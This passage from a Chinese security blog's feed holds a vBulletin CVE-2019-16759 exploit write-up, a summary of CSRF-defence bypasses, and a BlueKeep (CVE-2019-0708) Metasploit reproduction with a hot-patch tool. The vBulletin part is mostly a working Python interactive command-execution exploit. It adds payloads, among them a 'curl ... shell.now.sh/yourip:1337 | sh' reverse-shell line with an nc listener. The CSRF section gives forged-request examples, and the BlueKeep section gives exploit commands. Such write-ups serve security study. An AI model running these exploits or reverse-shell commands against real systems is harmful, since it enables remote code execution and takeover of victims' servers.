vBulletin&gt;&quot; % sys.argv[0])</span><br><span class="line"></span><br><span class="line">params = &#123;&quot;routestring&quot;:&quot;ajax/render/widget_php&quot;&#125;</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">     try:</span><br><span class="line">          cmd = raw_input(&quot;vBulletin$ &quot;)</span><br><span class="line">          params[&quot;widgetConfig[code]&quot;] = &quot;echo shell_exec(&apos;&quot;+cmd+&quot;&apos;); exit;&quot;</span><br><span class="line">          r = requests.post(url = sys.argv[1], data = params)</span><br><span class="line">          if r.status_code == 200:</span><br><span class="line">               print r.text</span><br><span class="line">          else:</span><br><span class="line">               sys.exit(&quot;Exploit failed! :(&quot;)</span><br><span class="line">     except KeyboardInterrupt:</span><br><span class="line">          sys.exit(&quot;\nClosing shell...&quot;)</span><br><span class="line">     except Exception, e:</span><br><span class="line">          sys.exit(str(e))</span><br></pre></td></tr></table></figure><h2><span id="0x06-漏洞复现">0X06 漏洞复现</span></h2><ul><li><p>漏洞地址：</p><p>  <font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H243ff923b53b4679a8702a6009b941b9f.jpg" style="zoom:30%"></center></font></p></li><li><p>访问漏洞URL，修改请求方式为POST：</p><p>  <font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H21d8a202c5e54ce0ab3bf74ffac27aa5O.jpg" style="zoom:30%"></center></font></p></li><li><p>然后在post参数中可输入以下任意payload验证：</p><ul><li><p>payload1：widgetConfig[code] = echo shell_exec(‘id’);<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/He0f05a02b58e463ca5a05d3023d36e21P.jpg" style="zoom:30%"></center></font></p></li><li><p>payload2：widgetConfig[code] = echo shell_exec(‘whoami’);<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H5c043157723a4bf58a3f908ad01e0e5ci.jpg" style="zoom:30%"></center></font></p></li><li><p>payload3：widgetConfig[code] = echo shell_exec(‘uname-a’);<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/Hd4a1783bda814bcc84064f03d41ffc7fs.jpg" style="zoom:30%"></center></font></p></li><li><p>payload4：widgetConfig[code] = echo shell_exec(‘curl <a href="https://shell.now.sh/yourip:1337" target="_blank" rel="noopener">https://shell.now.sh/yourip:1337</a> | sh’);</p></li><li><p>注意使用payload4反弹shell，参考如下：</p><ul><li><p>Reverse Shell as a Service</p><ul><li><a href="https://github.com/lukechilds/reverse-shell" target="_blank" rel="noopener">https://github.com/lukechilds/reverse-shell</a></li></ul></li><li><p>在你的机器：nc -l 1337<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H6e9006224f994e6dbb970bda9f3fd112J.jpg" style="zoom:30%"></center></font></p></li><li><p>在目标机器上：curl <a href="https://shell.now.sh/yourip:1337" target="_blank" rel="noopener">https://shell.now.sh/yourip:1337</a> | sh<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H776be97db07f4e419dc90d6cece7f660E.jpg" style="zoom:30%"></center></font></p></li><li><p>反弹Shell会话<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/Heb0bebfb2fa04d7e88703a212246ea1df.jpg" style="zoom:30%"></center></font></p></li></ul></li></ul></li></ul><h2><span id="0x07-修复建议">0X07 修复建议</span></h2><ul><li>上waf或防火墙配置规则拦截,等待官方修复打补丁。</li></ul><h2><span id="0x08-reference">0X08 Reference</span></h2><ul><li>参考链接：<a href="https://www.youtube.com/watch?v=ymLRqsbCuVY" target="_blank" rel="noopener">https://www.youtube.com/watch?v=ymLRqsbCuVY</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#0x00-简介&quot;&gt;0X00 简介&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x01-cve编号&quot;&gt;0X01 CVE编号&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x02-漏洞威胁等级&quot;&gt;0X02 漏洞威
      
    
    </summary>
    
    
      <category term="CVE-2019" scheme="http://www.vkxss.top/categories/CVE-2019/"/>
    
    
      <category term="CVE-2019-16759" scheme="http://www.vkxss.top/tags/CVE-2019-16759/"/>
    
  </entry>
  
  <entry>
    <title>绕过CSRF防御总结</title>
    <link href="http://www.vkxss.top/2019/09/19/%E7%BB%95%E8%BF%87CSRF%E9%98%B2%E5%BE%A1%E6%80%BB%E7%BB%93/"/>
    <id>http://www.vkxss.top/2019/09/19/绕过CSRF防御总结/</id>
    <published>2019-09-19T07:30:08.000Z</published>
    <updated>2019-11-01T05:24:48.685Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#一-先了解下csrf_token">一、 先了解下CSRF_TOKEN</a><ul><li><a href="#1-什么是csrf_token">1. 什么是CSRF_TOKEN</a></li><li><a href="#2-为什么csrf-token可以写在cookie里">2. 为什么CSRF-Token可以写在COOKIE里</a></li><li><a href="#3-常见csrf_token使用方式有两种">3. 常见csrf_token使用方式有两种：</a><ul><li><a href="#31-synchronizer-token-patternstp">3.1 Synchronizer token pattern(STP)</a></li><li><a href="#32-cookie-to-header-token">3.2 Cookie-to-header token</a></li></ul></li></ul></li><li><a href="#二-绕过csrf防御总结">二、绕过CSRF防御总结</a><ul><li><a href="#21-所有的csrf">2.1 所有的CSRF</a><ul><li><a href="#211-点击劫持">2.1.1 点击劫持</a></li><li><a href="#212-更改请求方法">2.1.2 更改请求方法</a></li></ul></li></ul></li><li><a href="#三-csrf-token的防御措施">三 、CSRF token的防御措施</a><ul><li><a href="#31-删除token参数或发送空token">3.1 删除token参数或发送空token</a></li><li><a href="#32-使用另一个session的csrf-token">3.2 使用另一个session的CSRF token</a></li><li><a href="#33-session固定">3.3 Session固定</a></li><li><a href="#34-通过xss获取csrf_token">3.4 通过XSS获取csrf_token</a></li><li><a href="#35-jsonp劫持获取csrf_token">3.5 Jsonp劫持获取csrf_token</a></li></ul></li><li><a href="#四-referer字段的csrf防御">四、 Referer字段的CSRF防御</a><ul><li><a href="#41-referer值为空或移除referer字段">4.1 Referer值为空或移除referer字段</a></li><li><a href="#42-绕过正则表达式">4.2 绕过正则表达式</a></li></ul></li></ul><!-- tocstop --><h2><span id="一-先了解下csrf_token">一、 先了解下CSRF_TOKEN</span></h2><h3><span id="1-什么是csrf_token">1. 什么是CSRF_TOKEN</span></h3><ul><li>就是防止跨站请求伪造（CSRF）的</li></ul><h3><span id="2-为什么csrf-token可以写在cookie里">2. 为什么CSRF-Token可以写在COOKIE里</span></h3><ul><li><p>将csrf令牌写入Cookie，是因为：<br>服务器进行csrf防御校验的时候，是拿用户http请求体中的token参数值和cookie中的csrftoken值进行比对。<br>如果值一样了，操作才被允许执行。</p></li><li><p>因为同源策略的限制，当正常用户通过账号密码等方式登陆网站A后，在不注销账号或当前COOKIE失效之前，再次访问网站A时（协议、IP、端口号相同则属于同源）浏览器会自动在HTTP请求包中带上该网站用户登陆后的COOKIE信息。这也就是为什么同源策略无法防御csrf的原因。</p></li><li><p>也就是说我们对CSRF的理解应为：攻击者借用用户COOKIE执行非用户本意的操作。</p></li><li><p>在此攻击过程中用户COOKIE对于攻击者来说是不可见的是未知的、不可见的，攻击者能做到仅仅是借用COOKIE，而COOKIE里面具体写了什么，攻击者是不知道的。又因为COOKIE里的信息对于攻击者来说是不可预知的，无法伪造的，所以将CSRF-TOKEN写在COOKIE中符合就CSRF防御思想中的不可预知原则。</p></li></ul><h3><span id="3-常见csrf_token使用方式有两种">3. 常见csrf_token使用方式有两种：</span></h3><h4><span id="31-synchronizer-token-patternstp">3.1 Synchronizer token pattern(STP)</span></h4><ul><li>对于每个request，在服务器端生成一个新的csrf_token，并将其返回在页面的表单中。在服务器端每次接收到请求时，都会验证表单中是否包含正确的csrf_token。由于第三方网站无法得知正确的csrf_token，所以无法进行csrf攻击。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">get_token = get_random_token()</span><br><span class="line"> return &#123;</span><br><span class="line">   &lt;form&gt;</span><br><span class="line">     &lt;input name=field1&gt;&lt;/input&gt;</span><br><span class="line">     &lt;input type=&quot;hidden&quot; name=&quot;csrfmiddlewaretoken&quot; value=#&#123;get_token()&#125; /&gt;</span><br><span class="line">   &lt;/form&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>这个方法的好处是客户端不需要支持javascript，因此通用于所有的网站。坏处是由于服务器端对于每个请求都会更换csrf_token，因此他需要保证用户提交的表单是用户最近一次请求的表单。如果用户通过多个tab同时浏览该网站，那么往往会导致用户提交的表单不是最新的那一个。</li></ul><h4><span id="32-cookie-to-header-token">3.2 Cookie-to-header token</span></h4><ul><li>第二个方法是为每个session生成一个csrf_token，随后将csrf_token保存到cookie中，之后通过javascript在每次请求时将csrf_token设置到http header中的X-Csrf-Token属性中。再在服务器端比较Cookie的csrf_token与header中的token是否一致。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//当用户登录时设置Cookie</span><br><span class="line">Set-Cookie: Csrf-token=i8XNjC4b8KVok4uw5RftR38Wgp2BFwql; expires=Thu, 23-Jul-2015 10:25:33 GMT; Max-Age=31449600; Path=/</span><br><span class="line"></span><br><span class="line">//当用户发送请求时设置Http Header中的X-Csrf-Token</span><br><span class="line">X-Csrf-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql</span><br></pre></td></tr></table></figure><h2><span id="二-绕过csrf防御总结">二、绕过CSRF防御总结</span></h2><ul><li><p>注：原文链接：<a href="https://medium.com/swlh/bypassing-csrf-protection-c9b217175ee（需要科学上网）" target="_blank" rel="noopener">https://medium.com/swlh/bypassing-csrf-protection-c9b217175ee（需要科学上网）</a></p></li><li><p>CSRF漏洞很容易就可以被发现并利用。一眼看去很多站点好像在这方面都做得不错：当你检查针对敏感操作的请求时，他们往往会实施CSRF保护。有时候可能是一个在请求主体中的CSRF token，也有可能是一个referer字段检测，或者有时是一个特殊的HTTP头字段或者cookie字段。</p></li><li><p>但是CSRF的防御不代表它就不可以被绕过。今天我们讨论一些我如何绕过CSRF防御措施的技术。</p></li></ul><h3><span id="21-所有的csrf">2.1 所有的CSRF</span></h3><ul><li>不管哪种CSRF防御措施部署，你都可以先尝试如下两件事：点击劫持和更改请求方法。</li></ul><h4><span id="211-点击劫持">2.1.1 点击劫持</span></h4><ul><li>在同一个功能端点利用点击劫持会绕过所有CSRF防御。因为从技术上讲，请求确实来自合法站点，如果易受攻击的端点所在页面容易遭受点击劫持攻击，那么所有的CSRF保护将变得没有效果，攻击者可以任意执行CSRF攻击。</li></ul><h4><span id="212-更改请求方法">2.1.2 更改请求方法</span></h4><ul><li>另外值得一试的方法就是更改请求的方法。如果要伪造的敏感请求是通过POST方法发送的，那么尝试将其转换为GET请求。如果操作时通过GET方法发送的，那么尝试转换为POST方法。应用程序可能仍然执行操作，且通常没有任何保护机制。</li></ul><ul><li>例如，如下请求：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty</span><br><span class="line">可以被改写成</span><br><span class="line"></span><br><span class="line">GET /change_password?new_password=qwerty</span><br></pre></td></tr></table></figure><h2><span id="三-csrf-token的防御措施">三 、CSRF token的防御措施</span></h2><ul><li>因为一个站点使用了CSRF token不代表这个token是有效验证对应请求操作的，可以尝试如下方法绕过CSRF的token保护。</li></ul><h3><span id="31-删除token参数或发送空token">3.1 删除token参数或发送空token</span></h3><ul><li><p>不发送token也可以正常请求数据是因为这种逻辑错误在应用程序中非常常见：应用程序有时会在token存在的时候或者token参数不为空的时候检查token的有效性。这种情况下，如果一个请求不包含token或者token值为空，那么也是有可能绕过CSRF的防御的。</p></li><li><p>例如，合法请求如下</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty &amp;csrf_tok=871caef0757a4ac9691aceb9aad8b65b</span><br><span class="line">那么实施这种请求：</span><br><span class="line"></span><br><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty</span><br><span class="line">或这种：</span><br><span class="line"></span><br><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty&amp;csrf_tok=</span><br></pre></td></tr></table></figure><h3><span id="32-使用另一个session的csrf-token">3.2 使用另一个session的CSRF token</span></h3><ul><li><p>应用程序可能只是检查token是否合法，但是不检查token是否确实归属于当前用户。如果是这种情况的话，你可以在payload中硬编码一个合法有效的token即可。</p></li><li><p>如果一个受害者的token是871caef0757a4ac9691aceb9aad8b65b，你自己的token是YOUR_TOKEN，那么你可以很容易获取到自己的token但很难获取到受害者的token。尝试在payload中提供自己的token来绕过CSRF防御。</p></li><li><p>换句话说，原本应该发送如下请求：</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty &amp;csrf_tok=871caef0757a4ac9691aceb9aad8b65b</span><br><span class="line">但是改成发送这个请求：</span><br><span class="line"></span><br><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty &amp;csrf_tok=YOUR_TOKEN</span><br></pre></td></tr></table></figure><h3><span id="33-session固定">3.3 Session固定</span></h3><ul><li><p>有时候站点使用一个双提交cookie作为一个CSRF的防御措施。这个表明这个请求需要包含一个cookie，其值为随机token值，且同时在请求参数中也有一个字段值为该随机token值。如果值相同，那么请求是合法的。这种防御形式是非常常见的。</p></li><li><p>如果一个双提交cookie用在了防御措施中，那么这个应用有可能没有将有效的token保存在服务器端。所以它没有办法指定token是否合法，并且也有可能很少检查cookie中的token值和参数中token值是不是一样的。这代表你可以发送一个假token，然后仍然可以有效实施CSRF攻击。</p></li><li><p>这种攻击包含两个步骤：第一步，你使用一个session固定技术去确认受害者的浏览器使用的是你提供的包含假token的session，然后第二步在参数中使用同一个token来执行这个CSRF攻击。</p></li><li><p>session固定。这是一个可以让你控制受害者的cookie存储的攻击；</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">执行如下请求来实施CSRF攻击</span><br><span class="line"></span><br><span class="line">POST /change_password</span><br><span class="line">Cookie: CSRF_TOK=FAKE_TOKEN;</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty &amp;csrf_tok=FAKE_TOKEN</span><br></pre></td></tr></table></figure><h3><span id="34-通过xss获取csrf_token">3.4 通过XSS获取csrf_token</span></h3><ul><li>前提是网站不存在XSS漏洞或者CSRF-Token具备httponly属性</li></ul><h3><span id="35-jsonp劫持获取csrf_token">3.5 Jsonp劫持获取csrf_token</span></h3><ul><li><a href="https://www.jianshu.com/p/1cda296cf7d2" target="_blank" rel="noopener">https://www.jianshu.com/p/1cda296cf7d2</a></li></ul><h2><span id="四-referer字段的csrf防御">四、 Referer字段的CSRF防御</span></h2><ul><li>如果attack.com是一个可控的域名，bank.com是一个要攻击的域名。这个站点没有使用CSRF token但是检查了referer字段。你应该怎么做？</li></ul><h3><span id="41-referer值为空或移除referer字段">4.1 Referer值为空或移除referer字段</span></h3><ul><li>首先，我们对空Referer的定义为，Referer 头部的内容为空，或者，一个HTTP请求中根本不包含Referer头部</li><li>和发送一个空token值相同，有时候你只需简单地移除referer字段就可以绕过CSRF防御。你可以添加如下meta标签到存在漏洞的页面。</li><li>扩展测试面：例如jsonp劫持</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;</span><br><span class="line">或</span><br><span class="line">&lt;meta name =&quot;referrer&quot; content =&quot;no-referrer&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li>应用程序可能只是在发送后才会验证，这种情况下你可以绕过其CSRF防御。</li></ul><h3><span id="42-绕过正则表达式">4.2 绕过正则表达式</span></h3><ul><li><p>如果referer检查是基于白名单的，你可以尝试绕过验证URL的正则表达式。例如，你可以尝试在referer的URL中将受害者域名置于二级域名区域或者URL目录区域。</p></li><li><p>如果一个站点在referer字段检查“bank.com”字段，那么“bank.com.attacker.com”或”attakcer.com/bank.com”可能可以绕过这种检测。</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#一-先了解下csrf_token&quot;&gt;一、 先了解下CSRF_TOKEN&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-什么是csrf_token&quot;&gt;1. 什么是CSRF_TOKEN&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="前端安全-CSRF" scheme="http://www.vkxss.top/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-CSRF/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-0708 远程桌面代码执行漏洞复现</title>
    <link href="http://www.vkxss.top/2019/09/07/CVE-2019-0708/"/>
    <id>http://www.vkxss.top/2019/09/07/CVE-2019-0708/</id>
    <published>2019-09-07T07:30:08.000Z</published>
    <updated>2019-09-20T02:01:32.249Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#0x00-简介">0X00 简介</a></li><li><a href="#0x01-环境准备">0X01 环境准备</a></li><li><a href="#0x02-漏洞复现">0x02 漏洞复现</a></li><li><a href="#0x03-漏洞检测修复工具批量快速扫描检测工具热补丁工具">0x03 漏洞检测修复工具&amp;批量快速扫描检测工具&amp;热补丁工具</a></li></ul><!-- tocstop --><h1><span id="0x00-简介">0X00 简介</span></h1><ul><li><p><font face="微软雅黑">Microsoft Windows是美国微软公司发布的视窗操作系统。远程桌面连接是微软从Windows 2000 Server开始提供的功能组件。</font></p></li><li><p><font face="微软雅黑">2019年5月14日，微软发布了月度安全更新补丁，修复了远程桌面协议（RDP）远程代码执行漏洞。未经身份验证的攻击者利用该漏洞，向目标 Windows主机发送恶意构造请求，可以在目标系统上执行任意代码。</font></p></li><li><p><font face="微软雅黑">近日，Metasploit发布了该漏洞的利用模块，GitHub网站上也公开了该漏洞的利用代码，引起了安全研究人员的广泛关注。目前该漏洞利用仅对Windows 7 SP1 x64与Windows 2008 R2 x64（非系统默认配置）系统版本有效，在虚拟机环境下复现成功。</font></p></li></ul><h1><span id="0x01-环境准备">0X01 环境准备</span></h1><ul><li><font face="微软雅黑">攻击机:kali</font></li><li><font face="微软雅黑">靶机：Win7</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows7 SP1下载链接</span><br><span class="line">ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/</span><br></pre></td></tr></table></figure><h1><span id="0x02-漏洞复现">0x02 漏洞复现</span></h1><ul><li><font face="微软雅黑">msf必须使用msf5（#msfupdate）</font></li><li><font face="微软雅黑">下载exp:<br><font face="微软雅黑">kali攻击机下载metasploit攻击脚本，kali中执行以下命令</font></font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb</span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br></pre></td></tr></table></figure><p><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/Hf34b7902d9a74301be767557b04a35cdq.jpg" style="zoom:30%"></center><br><font face="微软雅黑"><center>图：下载攻击载荷</center></font></font></p><ul><li><font face="微软雅黑">做如下替换（大部分人msf都装在如下位置）</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rdp.rb -&gt; </span><br><span class="line">/usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rb</span><br><span class="line">rdp_scanner.rb -&gt; </span><br><span class="line">/usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line">cve_2019_0708_bluekeep.rb -&gt; </span><br><span class="line">/usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class="line">cve_2019_0708_bluekeep_rce.rb -&gt; </span><br><span class="line">/usr/share/metasploit-framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br></pre></td></tr></table></figure><ul><li><font face="微软雅黑">做如下替换（我的位置）</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rdp.rb -&gt; </span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb</span><br><span class="line">rdp_scanner.rb -&gt; </span><br><span class="line">/opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line">cve_2019_0708_bluekeep.rb -&gt; </span><br><span class="line">/opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class="line">cve_2019_0708_bluekeep_rce.rb -&gt; </span><br><span class="line">/opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br></pre></td></tr></table></figure><ul><li><font face="微软雅黑">reload_all 重新加载所有的模块，将新添加的模块加载上。成功如下图：</font></li></ul><p><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/Hc7c188bf9d2a4e88957191a666d72664d.jpg" style="zoom:30%"></center><br><font face="微软雅黑"><center>图：成功加载攻击载荷</center></font></font></p><ul><li><font face="微软雅黑">使用攻击载荷</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; use exploit/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line">&gt; set rhosts 靶机IP</span><br><span class="line">&gt; set target 3 （根据靶机而定）</span><br><span class="line">&gt; exploit</span><br></pre></td></tr></table></figure><p><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/Ha677c5104fc84a6d8274518d5564febfs.jpg" style="zoom:40%"></center></font></p><ul><li>成功利用！！！！</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; set target 3</span><br></pre></td></tr></table></figure><p><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H74b9edc3a44c4bdfbe94779a9cee8705Z.jpg" style="zoom:50%"></center><br><font face="微软雅黑"><center>图：蓝屏</center></font></font></p><ul><li>再来一次！！！！</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; set target 1</span><br></pre></td></tr></table></figure><p><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H274ef8c81712437ebfa26f2e12366427P.jpg" style="zoom:50%"></center><br><font face="微软雅黑"><center>图：会话</center></font></font></p><h1><span id="0x03-漏洞检测修复工具amp批量快速扫描检测工具amp热补丁工具">0x03 漏洞检测修复工具&amp;批量快速扫描检测工具&amp;热补丁工具</span></h1><ul><li><font face="微软雅黑">下载页面：</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.qianxin.com/other/CVE-2019-0708</span><br></pre></td></tr></table></figure><ul><li><font face="微软雅黑">使用说明：</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;下载文件进行解压。</span><br><span class="line">&gt;使用win+R快捷键或开始菜单选择“运行”，输入cmd。调起命令行工具。</span><br><span class="line">&gt;在命令行工具，执行命令到工具所在文件夹</span><br><span class="line">&gt;输入命令对应功能，启用热补丁命令：QKShield.exe /enable ；禁用热补丁命令：QKShield.exe/disable 。</span><br><span class="line">&gt;重启系统后，需要重新运行命令行来启用热补丁</span><br></pre></td></tr></table></figure><ul><li><font face="微软雅黑">实现效果：</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">在工具支持的系统中启用热补丁后，用漏洞扫描工具扫描结果为没有漏洞。漏洞扫描工具下载地址：https://www.qianxin.com/other/CVE-2019-0708</span><br><span class="line">支持系统：</span><br><span class="line">Windows XP for 32-bit Systems Service Pack 3</span><br><span class="line">Windows 7 for 32-bit Systems</span><br><span class="line">Windows 7 for x64-based Systems</span><br><span class="line">Windows 7 for 32-bit Systems Service Pack 1</span><br><span class="line">Windows 7 for x64-based Systems Service Pack 1</span><br><span class="line">Windows Server 2003 for 32-bit Systems Service Pack 2</span><br><span class="line">Windows Server 2003 R2 for 32-bit Systems Service Pack2</span><br><span class="line">Windows Server 2008 for 32-bit Systems Service Pack 2</span><br><span class="line">Windows Server 2008 for 32-bit Systems Service Pack 2(Server Core installation)</span><br><span class="line">Windows Server 2008 for x64-based Systems Service Pack2</span><br><span class="line">Windows Server 2008 for x64-based Systems Service Pack2 (Server Core installation)</span><br><span class="line">Windows Server 2008 R2 for x64-based Systems ServicePack 1</span><br><span class="line">Windows Server 2008 R2 for x64-based Systems ServicePack 1 (Server Core installation)</span><br></pre></td></tr></table></figure><ul><li><font face="微软雅黑">暂不支持的系统：</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Windows Server 2003 for x64-based Systems Service Pack2</span><br><span class="line">Windows Server 2008 for Itanium-Based Systems ServicePack 2</span><br><span class="line">Windows Server 2008 R2 for Itanium-Based SystemsService Pack 1</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#0x00-简介&quot;&gt;0X00 简介&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x01-环境准备&quot;&gt;0X01 环境准备&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x02-漏洞复现&quot;&gt;0x02 漏洞复现&lt;/a
      
    
    </summary>
    
    
      <category term="CVE-2019" scheme="http://www.vkxss.top/categories/CVE-2019/"/>
    
    
      <category term="CVE-2019-0708" scheme="http://www.vkxss.top/tags/CVE-2019-0708/"/>
    
  </entry>
  
  <entry>
    <title>Insecure Randomness</title>
    <link href="http://www.vkxss.top/2019/08/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Insecure%20Randomness/"/>
    <id>http://www.vkxss.top/2019/08/22/代码审计-Insecure Randomness/</id>
    <published>2019-08-22T06:10:40.000Z</published>
    <updated>2019-09-20T02:01:37.919Z</updated>
    
